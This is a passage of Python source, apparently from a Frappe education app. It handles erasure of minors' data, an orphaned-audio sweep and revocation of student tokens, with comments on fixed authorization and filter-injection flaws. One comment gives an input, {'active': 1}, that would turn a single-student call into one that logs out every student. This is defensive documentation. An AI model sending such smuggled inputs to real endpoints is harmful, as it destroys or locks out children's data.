    separate protections, both required:
      * per-child erasure never sweeps: it unlinks only the paths of the clips it erased
        (_erase_capture_bytes);
      * this sweep skips anything modified in the last `min_age_secs`, so bytes still being
        written — or written by a transaction that has not committed yet — are never eligible.
        The age guard costs nothing in reach: bytes whose ROWS an erasure deleted are unlinked
        by path regardless of age (_pending_unlink), so only truly unattributable files wait.

    Pass 1 drops File rows whose Dialect Capture parent is gone, pass 2 removes CAPTURE AUDIO
    that no File row claims at all. Basenames come from `file_url`, the authoritative path.
    Never removes a path another File row still claims: those bytes may be the recording of a
    girl we are NOT erasing.

    Pass 2 is scoped by extension because it is the one BLIND pass — it judges by directory
    listing, not by a row. Unscoped it deleted every unreferenced file in private/files
    whatever it was; a verifier measured 54 unrelated private files destroyed by a single
    `bench migrate` (patch v9 calls this). That is collateral damage this function has no
    mandate for: it is the audio sweep. Scoping costs it nothing, because every capture is
    written with an extension from _CAPTURE_EXT (_save_dialect_capture) and
    _unshare_capture_bytes preserves it — so the reach over a child's voice is unchanged."""
    stale, paths = [], []
    for f in frappe.get_all("File", filters={"attached_to_doctype": "Dialect Capture"},
                            fields=["name", "attached_to_name", "file_url"]):
        if not (f.attached_to_name and frappe.db.exists("Dialect Capture", f.attached_to_name)):
            stale.append(f.name)
            paths.append(f.file_url)
    if stale:
        _db_delete_names("File", stale)      # rows now…
        frappe.db.commit()
    # …bytes after the commit: pass-1 paths plus anything an earlier erasure in this request
    # deleted the rows of without unlinking (see _pending_unlink) — both are row-scoped, so
    # they are removed regardless of age; only the blind directory pass below is age-guarded.
    removed = _erase_capture_bytes(list(_pending_unlink())
                                   + [p for p in (_private_path(u) for u in paths) if p])
    root = _private_files_dir()
    referenced = {u.rsplit("/", 1)[-1] for u in frappe.get_all("File", pluck="file_url") if u}
    audio_ext = set(_CAPTURE_EXT.values())
    cutoff = time.time() - max(0, _int(min_age_secs))
    for fn in (os.listdir(root) if os.path.isdir(root) else []):
        full = os.path.join(root, fn)
        if fn.startswith(".") or fn in referenced or not os.path.isfile(full):
            continue                     # conservative: only bytes NO File doc claims
        if os.path.splitext(fn)[1].lower() not in audio_ext:
            continue                     # not capture audio → not this sweep's business
        try:
            if os.path.getmtime(full) > cutoff:
                continue                 # in flight / just written → never eligible
            os.remove(full)
            removed += 1
        except OSError:                  # unreadable/racing file must not abort the sweep
            frappe.log_error("Capture sweep: could not remove " + fn, frappe.get_traceback())
    return len(stale), removed


@frappe.whitelist()   # STAFF-ONLY — enforced by _require_staff(), not by the decorator
def delete_student(student):
    """Erase a child's record and ALL her data (right-to-erasure for minors' data):
    attempts, tests, doubts, events, attendance, evaluations, AI chats, her whole Boli
    voice trail including the audio on disk, and the Frappe User of an online learner.
    Staff only. Use from Desk or a trusted admin tool.

    The _require_staff() call is the ONLY thing that makes that true — do not remove it
    and do not trust the decorator instead. This function used to carry the comment "NOT
    allow_guest → requires a logged-in Desk user", which was false: a bare whitelist
    refuses only Guest, and every online learner is a Website User. A verifier logged in
    as an ordinary learner and got {"ok": true, "deleted": "<another girl>"} — one
    unauthenticated-by-role POST away from irreversible, unrecoverable data loss for a
    child (delete_permanently=1 leaves no Deleted Document to restore from).

    ROWS IN ONE TRANSACTION, THEN THE BYTES. Everything down to the commit is a single
    transaction, so a failure part-way through erases nothing and leaves the Student row (and
    her user link) intact — a re-run then simply redoes the whole job. The audio is unlinked
    only afterwards, because filesystem deletes cannot be rolled back: with the old mid-way
    commit an error left rows restored but bytes already gone (a clip whose audio 500s), and a
    re-run could not even be attempted because the Student row was gone and this returned
    not_found. Where an older run already left that state behind, _erasure_residue lets a
    re-run finish it, and the same check after the commit is what stops this from reporting
    a success it did not achieve. `incomplete` means "nothing was promised, run it again"."""
    _require_staff()
    student = _docname(student)   # scalars only (see _docname): a dict here is an ORM FILTER,
    if not student:               # so it would resolve to — and irreversibly erase — SOME
        return {"ok": False, "error": "not_found"}   # OTHER girl than the one named
    sinfo = frappe.db.get_value("Student", student, ["student_name", "user"], as_dict=True) or {}
    if not sinfo and not _erasure_residue(student):
        return {"ok": False, "error": "not_found"}
    receipt = []
    for dt in _LEARNER_DOCTYPES:
        _erase(dt, _erasable(dt, {"student": student}), receipt)
    paths = _erase_boli_data(student, receipt)
    if sinfo.get("user"):
        # drop the link BEFORE the User goes, so the Student row never points at a
        # deleted User even for the rest of this transaction
        frappe.db.set_value("Student", student, "user", None, update_modified=False)
        _erase_student_user(sinfo.get("user"), receipt)
    if sinfo:
        frappe.delete_doc("Student", student, force=1, ignore_permissions=True,
                          delete_permanently=True)
        receipt.append(("Student", student))
    frappe.db.commit()
    # Never report success on a rollback we did not notice: a statement error or lock
    # timeout anywhere above can make MariaDB roll the whole transaction back, and a
    # facilitator told "erased" cannot un-tell a child. Re-running is safe and idempotent.
    if frappe.db.exists("Student", student) or _erasure_residue(student):
        return {"ok": False, "error": "incomplete"}
    _erase_capture_bytes(paths)   # bytes LAST — only once the row deletions are durable
    # bookkeeping residue last of all, outside the erasure transaction (see the helper)
    _scrub_name_residue(receipt, student=student, user=sinfo.get("user"))
    frappe.db.commit()
    return {"ok": True, "deleted": sinfo.get("student_name"), "resumed": not sinfo}


@frappe.whitelist()   # STAFF-ONLY — enforced by _require_staff(), not by the decorator
def revoke_student_token(student):
    """Force a student to re-login everywhere: rotate their auth_token to a fresh value so any
    cached token (e.g. on a lost/handed-down laptop) stops working immediately. Use from Desk.

    Staff only, for the same reason as delete_student — the bare whitelist let any online
    learner log any other girl out of her own offline device (a denial of service on a
    campus laptop that may not see the internet again for days, i.e. she cannot re-login)."""
    _require_staff()
    # Scalars only (see _docname), even behind the staff gate: this writes with
    # frappe.db.set_value, where a dict `student` is an ORM FILTER, so {"active": 1} would log
    # EVERY girl on the site out of her offline device in one call. It does not go through
    # _token_for, so that sink's coercion never sees it — the guard has to be here.
    student = _docname(student)
    if not student or not frappe.db.exists("Student", student):
        return {"ok": False, "error": "not_found"}
    frappe.db.set_value("Student", student,
                        {"auth_token": frappe.generate_hash(length=40),
                         "token_issued_on": frappe.utils.now()},
                        update_modified=False)
    frappe.db.commit()
    return {"ok": True}
